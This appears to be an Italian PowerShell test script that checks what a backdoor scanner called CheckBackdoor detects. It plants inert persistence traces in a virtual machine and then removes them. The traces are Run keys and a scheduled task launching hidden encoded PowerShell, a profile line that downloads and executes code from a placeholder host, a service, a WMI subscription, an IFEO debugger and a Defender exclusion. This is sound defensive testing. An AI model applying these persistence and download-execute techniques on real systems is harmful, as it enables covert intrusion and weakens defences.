<#
.SYNOPSIS
    Misura cosa rileva CheckBackdoor: crea tecniche di persistenza INNOCUE, esegue la
    verifica, controlla quali sono state trovate e rimuove tutto.

.DESCRIPTION
    Da usare SOLO in una macchina virtuale di prova. Come Atomic Red Team, simula le tracce
    che una backdoor lascia (voce di avvio, attivita' pianificata, servizio, WMI, esclusione
    di Defender...) ma con comandi che non fanno nulla: il "carico" e' un Write-Output, e
    nessuna voce viene mai eseguita (l'attivita' parte nel 2099, il servizio e' manuale).

    Alla fine, sempre, rimuove cio' che ha creato, anche se la verifica fallisce.
    Scrive una tabella Markdown con il risultato di ogni tecnica.

    Senza privilegi di amministratore prova solo le tecniche per utente.

.PARAMETER IgnoraControlloVM
    Il programma rifiuta di partire se Windows non sembra una macchina virtuale. Usalo solo
    se la tua VM non viene riconosciuta (il produttore non contiene Virtual, VMware...).

.EXAMPLE
    .\tools\Prova-Rilevamenti.ps1
#>
[CmdletBinding()]
param(
    [string]$OutputDir,
    [switch]$IgnoraControlloVM
)

$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $PSScriptRoot
$engine = Join-Path $root 'CheckBackdoor.ps1'
if (-not $OutputDir) { $OutputDir = Join-Path $root 'report\validazione' }
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# --- Solo in una macchina virtuale -------------------------------------------------
$cs = Get-CimInstance Win32_ComputerSystem
$isVm = "$($cs.Manufacturer) $($cs.Model)" -match 'Virtual|VMware|VirtualBox|QEMU|KVM|Hyper-V|Parallels|Xen|innotek|Bochs'
if (-not $isVm -and -not $IgnoraControlloVM) {
    Write-Host "`n  Questo PC non sembra una macchina virtuale ($($cs.Manufacturer) $($cs.Model))." -ForegroundColor Red
    Write-Host "  Prova-Rilevamenti crea voci di avvio e servizi di prova: va eseguito solo in una VM.`n" -ForegroundColor Red
    exit 2
}
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Carico innocuo, codificato come fanno i malware (composto qui, non scritto per intero)
$payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "CheckBackdoor prova innocua"'))
$hiddenPs = "powershell.exe -NoProfile -WindowStyle Hidden -Enc $payload"
$tag = 'CBProva'
$work = Join-Path $env:PUBLIC "$tag"
New-Item -ItemType Directory -Path $work -Force | Out-Null

$techniques = @(
    @{ Id = 'run'; Mitre = 'T1547.001'; Name = 'Voce Run (HKCU) con PowerShell nascosto'; Admin = $false
        Setup = { New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "$tag-Run" -Value $hiddenPs -Force | Out-Null }
        Cleanup = { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "$tag-Run" -ErrorAction SilentlyContinue } }
    @{ Id = 'startup'; Mitre = 'T1547.001'; Name = 'Script nella cartella Esecuzione automatica'; Admin = $false
        Setup = { Set-Content -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) "$tag.vbs") -Value "' ${tag}: file di prova, non fa nulla" }
        Cleanup = { Remove-Item -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) "$tag.vbs") -Force -ErrorAction SilentlyContinue } }
    @{ Id = 'task'; Mitre = 'T1053.005'; Name = 'Attivita'' pianificata con PowerShell nascosto'; Admin = $false
        Setup = {
            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -Enc $payload"
            $t = New-ScheduledTaskTrigger -Once -At ([datetime]'2099-01-01')
            Register-ScheduledTask -TaskPath "\$tag\" -TaskName "$tag-Attivita" -Action $a -Trigger $t -Force | Out-Null }
        Cleanup = { Unregister-ScheduledTask -TaskPath "\$tag\" -TaskName "$tag-Attivita" -Confirm:$false -ErrorAction SilentlyContinue } }
    @{ Id = 'profile'; Mitre = 'T1546.013'; Name = 'Profilo PowerShell che scarica ed esegue'; Admin = $false
        Setup = {
            $p = $PROFILE.CurrentUserAllHosts
            $script:ProfileBackup = if (Test-Path -LiteralPath $p) { [IO.File]::ReadAllText($p) } else { $null }
            New-Item -ItemType Directory -Path (Split-Path $p) -Force | Out-Null
            $line = '# ' + $tag + "`n" + 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://esempio.invalid/' + $tag + ''')'
            Add-Content -LiteralPath $p -Value $line }
        Cleanup = {
            $p = $PROFILE.CurrentUserAllHosts
            if ($null -eq $script:ProfileBackup) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue }
            else { [IO.File]::WriteAllText($p, $script:ProfileBackup) } } }
    @{ Id = 'bits'; Mitre = 'T1197'; Name = 'Processo BITS con comando di notifica'; Admin = $false
        Setup = {
            & bitsadmin.exe /create $tag | Out-Null
            & bitsadmin.exe /addfile $tag "https://esempio.invalid/$tag.bin" (Join-Path $work "$tag.bin") | Out-Null
            & bitsadmin.exe /SetNotifyCmdLine $tag 'C:\Windows\System32\cmd.exe' "cmd.exe /c echo $tag" | Out-Null }
        Cleanup = { & bitsadmin.exe /cancel $tag | Out-Null } }
    @{ Id = 'ifeo'; Mitre = 'T1546.012'; Name = 'Debugger IFEO su un programma'; Admin = $true
        Setup = {
            $k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tag.exe"
            New-Item -Path $k -Force | Out-Null
            New-ItemProperty -Path $k -Name Debugger -Value (Join-Path $work "$tag-debugger.exe") -Force | Out-Null }
        Cleanup = { Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tag.exe" -Recurse -Force -ErrorAction SilentlyContinue } }
    @{ Id = 'service'; Mitre = 'T1543.003'; Name = 'Servizio che lancia PowerShell nascosto'; Admin = $true
        Setup = { & sc.exe create "$tag-Svc" binPath= "cmd.exe /c $hiddenPs" start= demand | Out-Null }
        Cleanup = { & sc.exe delete "$tag-Svc" | Out-Null } }
    @{ Id = 'wmi'; Mitre = 'T1546.003'; Name = 'Sottoscrizione WMI permanente'; Admin = $true
        Setup = {
            $ns = 'root\subscription'
            $f = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{ Name = "$tag-Filtro"; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Year = 2099" }
            $c = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{ Name = "$tag-Consumer"; CommandLineTemplate = "cmd.exe /c echo $tag" }
            Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{ Filter = $f; Consumer = $c } | Out-Null }
        Cleanup = {
            $ns = 'root\subscription'
            Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $tag } | Remove-WmiObject
            Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$tag-Consumer'" -ErrorAction SilentlyContinue | Remove-WmiObject
            Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='$tag-Filtro'" -ErrorAction SilentlyContinue | Remove-WmiObject } }
    @{ Id = 'exclusion'; Mitre = 'T1562.001'; Name = 'Esclusione di Microsoft Defender'; Admin = $true
        Setup = { Add-MpPreference -ExclusionPath $work }
        Cleanup = { Remove-MpPreference -ExclusionPath $work -ErrorAction SilentlyContinue } }
)

$results = New-Object System.Collections.Generic.List[object]
$created = New-Object System.Collections.Generic.List[object]
try {
    foreach ($t in $techniques) {
        if ($t.Admin -and -not $isAdmin) {
            $results.Add([pscustomobject]@{ Tecnica = $t.Name; Mitre = $t.Mitre; Esito = 'Non provata'; Gravita = ''; Nota = 'Serve l''amministratore' })
            continue
        }
        try { & $t.Setup; $created.Add($t) }
        catch { $results.Add([pscustomobject]@{ Tecnica = $t.Name; Mitre = $t.Mitre; Esito = 'Non creata'; Gravita = ''; Nota = $_.Exception.Message }) }
    }

    Write-Host "  Create $($created.Count) tecniche di prova. Avvio la verifica..." -ForegroundColor Cyan
    $scanOut = Join-Path $OutputDir 'scansione'
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $engine -NoElevate -Quiet -NoOpen -OutputDir $scanOut -Skip 'FileSystem,Processes,Network,Browser,Injections,Timeline' | Out-Null
    $json = Get-ChildItem -LiteralPath $scanOut -Filter 'scansione_*.json' | Sort-Object LastWriteTime | Select-Object -Last 1
    $report = [IO.File]::ReadAllText($json.FullName) | ConvertFrom-Json

    foreach ($t in $created) {
        # La tecnica e' rilevata se una segnalazione (non solo informativa) contiene il marcatore
        $hits = @($report.Findings | Where-Object {
                $_.Severity -ne 'Info' -and ("$($_.Title) $($_.Path) $($_.Evidence) $($_.Detail)" -match $tag -or
                    ($t.Id -eq 'exclusion' -and "$($_.Title) $($_.Evidence)" -match [regex]::Escape($work)) -or
                    ($t.Id -eq 'profile' -and $_.Title -like 'Profilo PowerShell*')) })
        $order = @{ Alto = 0; Medio = 1; Basso = 2 }
        $best = $hits | Sort-Object { $order[$_.Severity] } | Select-Object -First 1
        $results.Add([pscustomobject]@{
                Tecnica = $t.Name; Mitre = $t.Mitre
                Esito = if ($best) { 'Rilevata' } else { 'NON rilevata' }
                Gravita = if ($best) { $best.Severity } else { '' }
                Nota = if ($best) { $best.Title } else { '' }
            })
    }
} finally {
    foreach ($t in $created) {
        try { & $t.Cleanup } catch { Write-Host "  Rimozione non riuscita per '$($t.Name)': $($_.Exception.Message)" -ForegroundColor Red }
    }
    Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
}

$os = Get-CimInstance Win32_OperatingSystem
$md = New-Object System.Text.StringBuilder
[void]$md.AppendLine("# Prova dei rilevamenti - $(Get-Date -Format 'dd/MM/yyyy HH:mm')")
[void]$md.AppendLine('')
[void]$md.AppendLine("Sistema: $($os.Caption) $($os.Version), lingua $((Get-Culture).Name), amministratore: $isAdmin, VM: $isVm")
[void]$md.AppendLine('')
[void]$md.AppendLine('| Tecnica | MITRE | Esito | Gravita | Segnalazione |')
[void]$md.AppendLine('|---|---|---|---|---|')
foreach ($r in $results) { [void]$md.AppendLine("| $($r.Tecnica) | $($r.Mitre) | $($r.Esito) | $($r.Gravita) | $(($r.Nota -replace '\|', '/')) |") }
$file = Join-Path $OutputDir "validazione_$(Get-Date -Format 'yyyyMMdd_HHmmss').md"
[IO.File]::WriteAllText($file, $md.ToString(), (New-Object Text.UTF8Encoding($false)))
Write-Host ''
$results | Format-Table -AutoSize | Out-String -Width 200 | Write-Host
Write-Host "  Tabella salvata in $file" -ForegroundColor Cyan
if (@($results | Where-Object Esito -eq 'NON rilevata').Count) { exit 1 } else { exit 0 }
